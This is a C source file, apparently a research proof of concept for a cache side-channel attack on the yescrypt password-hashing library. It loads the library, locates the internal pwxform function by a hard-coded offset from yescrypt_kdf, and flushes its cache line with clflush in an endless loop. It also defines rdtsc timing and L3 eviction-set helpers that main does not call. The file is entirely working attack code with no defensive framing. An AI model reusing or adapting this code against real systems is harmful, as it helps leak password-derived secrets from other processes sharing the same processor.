#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include "constants.h"

#define REPEAT 20

void clflush(uint64_t addr)
{
    asm volatile ("clflush (%0)"::"r"(addr));
}

uint32_t measure_one_block_access_time(uint64_t addr)
{
	uint32_t cycles;

	asm volatile("mov %1, %%r8\n\t"
	"lfence\n\t"
	"rdtsc\n\t"
	"mov %%eax, %%edi\n\t"
	"mov (%%r8), %%r8\n\t"
	"lfence\n\t"
	"rdtsc\n\t"
	"sub %%edi, %%eax\n\t"
	: "=a"(cycles) /*output*/
	: "r"(addr)
	: "r8", "edi");	

	return cycles;
}

void wait_cycles(uint64_t cycles){
    uint64_t start, end;
    __asm__ volatile("lfence\n\t"
    "rdtsc\n\t"
    : "=a"(start));

    do {
        __asm__ volatile("lfence\n\t"
            "rdtsc\n\t"
            : "=a"(end));
    }while (end-start < cycles);
}

static inline void mfence() {
    asm volatile("mfence");
}

void get_eviction_set(void *buf, void **eviction_set, uint64_t set) {

    for (int i=0; i<L3_ASSOC; i++){
        eviction_set[i] = (void *) ((uint64_t)buf + (uint64_t)(i<<16) + (uint64_t)(set<<6));
    }
    
}

int main() {
    uint32_t t;
    void *handle_libyescrypt = dlopen("../libyescrypt-ref.so", RTLD_LAZY);
    void (*yescrypt_kdf)() = dlsym(handle_libyescrypt, "yescrypt_kdf");

    //pay attention on portion of code inside the cache line
    void (*pwxform)() = yescrypt_kdf - 0x14ed; 
    
    do {
        clflush((uint64_t) pwxform);
        mfence();
        //clflush((uint64_t) pwxform);
        //mfence();
        //wait_cycles(500);
    } while (1);
    
    return 0;
}
